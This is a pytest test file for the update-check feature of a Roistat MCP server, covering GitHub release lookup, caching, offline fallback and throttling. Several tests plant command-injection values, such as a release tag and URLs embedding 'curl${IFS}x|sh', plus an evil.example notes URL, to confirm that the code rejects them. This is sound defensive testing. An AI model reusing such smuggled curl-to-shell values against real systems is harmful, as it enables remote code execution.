from __future__ import annotations

import json
import time
from dataclasses import replace

import httpx
import pytest
from fastmcp import Client

from zai_roistat import __version__, update_check
from zai_roistat.config import ServiceConfig
from zai_roistat.server import AdmittedHttpClient, create_server

REPO_API = "https://api.github.com/repos/zai-one/roistat-mcp"


def bump(version: str) -> str:
    major, minor, patch = (update_check.parse_version(version) or (0, 0, 0))[:3]
    return f"{major}.{minor + 1}.0"


NEWER = bump(__version__)


def client_for(handler) -> httpx.AsyncClient:
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


@pytest.fixture
def enabled(monkeypatch):
    monkeypatch.delenv("ROISTAT_DISABLE_UPDATE_CHECK", raising=False)


def release_handler(tag: str, calls: list[str]):
    def handler(request: httpx.Request) -> httpx.Response:
        calls.append(str(request.url))
        assert "authorization" not in request.headers
        assert str(request.url) == f"{REPO_API}/releases/latest"
        return httpx.Response(
            200,
            json={"tag_name": tag, "html_url": f"https://github.com/zai-one/roistat-mcp/releases/tag/{tag}"},
        )

    return handler


async def test_newer_release_is_suggested_and_cached(tmp_path, enabled):
    calls: list[str] = []
    cache = tmp_path / "update-check.json"
    async with client_for(release_handler(f"v{NEWER}", calls)) as client:
        result = await update_check.check_for_update(cache, client=client)
        again = await update_check.check_for_update(cache, client=client)
    assert result["update_available"] is True
    assert result["current_version"] == __version__ and result["latest_version"] == NEWER
    assert result["release_notes_url"].endswith(f"/releases/tag/v{NEWER}")
    assert result["auto_update"] is False and result["update_command"]
    assert (
        f"/releases/download/v{NEWER}/zai_roistat_mcp-{NEWER}-py3-none-any.whl"
        in (result["update_commands"]["release_package"])
    )
    assert again["source"] == "cache" and len(calls) == 1
    assert json.loads(cache.read_text())["latest"] == f"v{NEWER}"


async def test_same_version_reports_no_update(tmp_path, enabled):
    async with client_for(release_handler(f"v{__version__}", [])) as client:
        result = await update_check.check_for_update(tmp_path / "c.json", client=client)
    assert result["update_available"] is False and result["update_command"] is None


async def test_falls_back_to_tags_when_no_release(tmp_path, enabled):
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path.endswith("/releases/latest"):
            return httpx.Response(404, json={"message": "Not Found"})
        return httpx.Response(200, json=[{"name": "v0.1.0"}, {"name": f"v{NEWER}"}, {"name": "junk"}])

    async with client_for(handler) as client:
        result = await update_check.check_for_update(tmp_path / "c.json", client=client)
    assert result["latest_version"] == NEWER and result["update_available"] is True


async def test_offline_failure_is_graceful_and_uses_stale_cache(tmp_path, enabled):
    def boom(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError("offline", request=request)

    cache = tmp_path / "c.json"
    async with client_for(boom) as client:
        result = await update_check.check_for_update(cache, client=client)
    assert result["status"] == "unknown" and result["update_available"] is False
    cache.write_text(
        json.dumps(
            {
                "repository": "zai-one/roistat-mcp",
                "latest": f"v{NEWER}",
                "release_notes_url": "https://github.com/zai-one/roistat-mcp/releases",
                "checked_at": time.time() - 10 * 86400,
            }
        )
    )
    async with client_for(boom) as client:
        stale = await update_check.check_for_update(cache, client=client)
    assert stale["source"] == "stale_cache" and stale["update_available"] is True


async def test_http_error_and_bad_payload_are_unknown(tmp_path, enabled):
    async with client_for(lambda request: httpx.Response(403, json={})) as client:
        assert (await update_check.check_for_update(tmp_path / "a.json", client=client))[
            "status"
        ] == "unknown"
    async with client_for(lambda request: httpx.Response(200, json={"tag_name": None})) as client:
        assert (await update_check.check_for_update(tmp_path / "b.json", client=client))[
            "status"
        ] == "unknown"


async def test_opt_out_makes_no_request(tmp_path, monkeypatch):
    monkeypatch.setenv("ROISTAT_DISABLE_UPDATE_CHECK", "1")

    def fail(request: httpx.Request) -> httpx.Response:
        raise AssertionError("network used while disabled")

    async with client_for(fail) as client:
        result = await update_check.check_for_update(tmp_path / "c.json", client=client)
    assert result["status"] == "disabled"
    assert update_check.startup_hint(tmp_path / "c.json") == ""


def test_version_parsing():
    assert update_check.parse_version("v1.2") == (1, 2, 0)
    assert update_check.parse_version("0.10.1") > update_check.parse_version("0.9.9")
    assert update_check.parse_version("main") is None


def _cache(path, tag):
    path.write_text(
        json.dumps(
            {
                "repository": "zai-one/roistat-mcp",
                "latest": tag,
                "release_notes_url": f"https://github.com/zai-one/roistat-mcp/releases/tag/{tag}",
                "checked_at": time.time(),
            }
        )
    )


async def test_server_instructions_tool_and_health_surface_cached_hint(tmp_path, enabled, monkeypatch):
    settings = replace(
        ServiceConfig(api_key="synthetic", state_path=tmp_path / "state.sqlite", project_allowlist="12345")
    )
    _cache(tmp_path / "update-check.json", f"v{NEWER}")

    async def no_network(*args, **kwargs):
        raise AssertionError("health must not fetch")

    class FixtureHttp(AdmittedHttpClient):
        async def request(self, method, url, **kwargs):
            await self._admit_attempt(1)
            return {"status": "success", "projects": [{"id": 12345}]}

    server = create_server(settings, transport="stdio", http_factory=FixtureHttp)
    async with Client(server) as client:
        assert f"Update available: zai-roistat-mcp {NEWER}" in (client.initialize_result.instructions or "")
        monkeypatch.setattr(update_check, "_fetch_latest", no_network)
        result = (await client.call_tool("roistat_check_update", {})).data
        health = (await client.call_tool("roistat_health", {})).data
    assert result["update_available"] is True and result["source"] == "cache"
    assert health["update"]["latest_version"] == NEWER
    assert health["update"]["update_command"]


async def test_no_hint_without_cache(tmp_path, enabled):
    settings = ServiceConfig(api_key="synthetic", state_path=tmp_path / "state.sqlite")
    async with Client(create_server(settings, transport="stdio")) as client:
        assert "Update available" not in (client.initialize_result.instructions or "")


INJECTED_TAG = 'v9.9.9";curl${IFS}x|sh;"'


def assert_no_injection(value) -> None:
    text = json.dumps(value) if not isinstance(value, str) else value
    for fragment in ("curl", "IFS", "|sh", "9.9.9"):
        assert fragment not in text


def test_version_parsing_requires_plain_tags():
    assert update_check.parse_version("v1.2.3") == (1, 2, 3)
    assert update_check.parse_version("1.2.3.4") == (1, 2, 3, 4)
    bad_tags = (INJECTED_TAG, "v1.2.3-rc1", "v1.2.3 ", " v1.2.3", "v1.2.3\n", "v1.2.3.4.5", "v\u0661.2.3")
    for bad in (*bad_tags, "v" + "9" * 40):
        assert update_check.parse_version(bad) is None, bad
    assert update_check.update_commands(INJECTED_TAG) == {
        "git_checkout": "git pull --ff-only && uv sync --frozen"
    }


async def test_injected_release_tag_never_reaches_result(tmp_path, enabled):
    calls: list[str] = []
    cache = tmp_path / "update-check.json"
    async with client_for(release_handler(INJECTED_TAG, calls)) as client:
        result = await update_check.check_for_update(cache, client=client)
    assert result["status"] == "unknown" and result["latest_version"] is None
    assert result["update_available"] is False and result["update_commands"] == {}
    assert_no_injection(result)
    assert_no_injection(cache.read_text())
    assert update_check.startup_hint(cache) == ""


async def test_injected_tag_in_tag_list_is_ignored(tmp_path, enabled):
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path.endswith("/releases/latest"):
            return httpx.Response(404, json={})
        return httpx.Response(200, json=[{"name": INJECTED_TAG}, {"name": f"v{NEWER}"}])

    async with client_for(handler) as client:
        result = await update_check.check_for_update(tmp_path / "c.json", client=client)
    assert result["latest_version"] == NEWER
    assert_no_injection(result)


async def test_untrusted_notes_url_is_replaced(tmp_path, enabled):
    def handler(request: httpx.Request) -> httpx.Response:
        url = 'https://github.com/x";curl${IFS}x|sh'
        return httpx.Response(200, json={"tag_name": f"v{NEWER}", "html_url": url})

    async with client_for(handler) as client:
        result = await update_check.check_for_update(tmp_path / "c.json", client=client)
    assert result["release_notes_url"] == f"https://github.com/zai-one/roistat-mcp/releases/tag/v{NEWER}"


async def test_injected_cached_tag_is_treated_as_no_release(tmp_path, enabled):
    cache = tmp_path / "update-check.json"
    cache.write_text(
        json.dumps(
            {
                "repository": "zai-one/roistat-mcp",
                "latest": INJECTED_TAG,
                "release_notes_url": 'https://github.com/zai-one/roistat-mcp/releases";curl${IFS}x|sh',
                "checked_at": time.time(),
            }
        )
    )
    assert update_check.cached_status(cache) is None
    assert update_check.startup_hint(cache) == ""
    settings = ServiceConfig(api_key="synthetic", state_path=tmp_path / "state.sqlite")
    async with Client(create_server(settings, transport="stdio")) as client:
        instructions = client.initialize_result.instructions or ""
    assert_no_injection(instructions)
    assert "Update available" not in instructions


async def test_cached_notes_url_is_validated(tmp_path, enabled):
    cache = tmp_path / "update-check.json"
    cache.write_text(
        json.dumps(
            {
                "repository": "zai-one/roistat-mcp",
                "latest": f"v{NEWER}",
                "release_notes_url": "https://evil.example/notes",
                "checked_at": time.time(),
            }
        )
    )
    status = update_check.cached_status(cache)
    assert status["update_available"] is True and status["release_notes_url"] is None
    hint = update_check.startup_hint(cache)
    assert NEWER in hint and "evil" not in hint and "Details" not in hint


async def test_offline_repeated_calls_fetch_once(tmp_path, enabled, monkeypatch):
    calls: list[str] = []

    def boom(request: httpx.Request) -> httpx.Response:
        calls.append(str(request.url))
        raise httpx.ConnectError("offline", request=request)

    cache = tmp_path / "c.json"
    async with client_for(boom) as client:
        first = await update_check.check_for_update(cache, client=client)
        second = await update_check.check_for_update(cache, client=client)
        third = await update_check.check_for_update(cache, client=client)
    assert len(calls) == 1
    assert first["status"] == "unknown" and first["error"] == "ConnectError"
    assert second["status"] == third["status"] == "unknown"
    assert second["error"] == "recent_failure" and second["throttled"] is True
    recorded = json.loads(cache.read_text())
    assert recorded["attempted_at"] == recorded["failed_at"]
    # After the 30-minute back-off the next call fetches again.
    later = time.time() + update_check.FAILURE_BACKOFF_SECONDS + 1
    monkeypatch.setattr(update_check.time, "time", lambda: later)
    async with client_for(boom) as client:
        await update_check.check_for_update(cache, client=client)
    assert len(calls) == 2


async def test_failure_back_off_keeps_last_good_result(tmp_path, enabled):
    cache = tmp_path / "c.json"
    cache.write_text(
        json.dumps(
            {
                "repository": "zai-one/roistat-mcp",
                "latest": f"v{NEWER}",
                "release_notes_url": "https://github.com/zai-one/roistat-mcp/releases",
                "checked_at": time.time() - 2 * 86400,
                "attempted_at": time.time() - 60,
                "failed_at": time.time() - 60,
            }
        )
    )

    def fail(request: httpx.Request) -> httpx.Response:
        raise AssertionError("fetched during back-off")

    async with client_for(fail) as client:
        result = await update_check.check_for_update(cache, client=client)
    assert result["status"] == "unknown" and result["source"] == "stale_cache"
    assert result["update_available"] is True and result["latest_version"] == NEWER


async def test_forced_calls_within_a_minute_fetch_once(tmp_path, enabled):
    calls: list[str] = []
    cache = tmp_path / "c.json"
    async with client_for(release_handler(f"v{NEWER}", calls)) as client:
        first = await update_check.check_for_update(cache, force=True, client=client)
        second = await update_check.check_for_update(cache, force=True, client=client)
    assert len(calls) == 1
    assert first["source"] == "github"
    assert second["source"] == "cache" and second["throttled"] is True and second["latest_version"] == NEWER


async def test_forced_calls_throttled_without_successful_cache(tmp_path, enabled, monkeypatch):
    calls: list[str] = []

    def boom(request: httpx.Request) -> httpx.Response:
        calls.append(str(request.url))
        raise httpx.ConnectError("offline", request=request)

    cache = tmp_path / "c.json"
    async with client_for(boom) as client:
        await update_check.check_for_update(cache, force=True, client=client)
        throttled = await update_check.check_for_update(cache, force=True, client=client)
    assert len(calls) == 1 and throttled["throttled"] is True and throttled["source"] == "none"
    later = time.time() + update_check.FORCE_MIN_INTERVAL_SECONDS + 1
    monkeypatch.setattr(update_check.time, "time", lambda: later)
    async with client_for(boom) as client:
        await update_check.check_for_update(cache, force=True, client=client)
    assert len(calls) == 2


async def test_throttle_survives_unwritable_cache(tmp_path, enabled):
    calls: list[str] = []

    def boom(request: httpx.Request) -> httpx.Response:
        calls.append(str(request.url))
        raise httpx.ConnectError("offline", request=request)

    blocker = tmp_path / "not-a-directory"
    blocker.write_text("x")
    cache = blocker / "c.json"
    async with client_for(boom) as client:
        await update_check.check_for_update(cache, force=True, client=client)
        await update_check.check_for_update(cache, force=True, client=client)
        await update_check.check_for_update(cache, client=client)
    assert len(calls) == 1


async def test_tool_force_is_throttled(tmp_path, enabled, monkeypatch):
    settings = ServiceConfig(api_key="synthetic", state_path=tmp_path / "state.sqlite")
    calls: list[int] = []

    async def offline(client):
        calls.append(1)
        raise httpx.ConnectError("offline")

    monkeypatch.setattr(update_check, "_open_client", lambda: client_for(lambda request: httpx.Response(500)))
    monkeypatch.setattr(update_check, "_fetch_latest", offline)
    async with Client(create_server(settings, transport="stdio")) as client:
        first = (await client.call_tool("roistat_check_update", {"force": True})).data
        second = (await client.call_tool("roistat_check_update", {"force": True})).data
    assert len(calls) == 1
    assert first["status"] == second["status"] == "unknown" and second["throttled"] is True


async def test_missing_client_never_opens_real_network(tmp_path, enabled):
    with pytest.raises(AssertionError, match="real network client"):
        await update_check.check_for_update(tmp_path / "c.json")
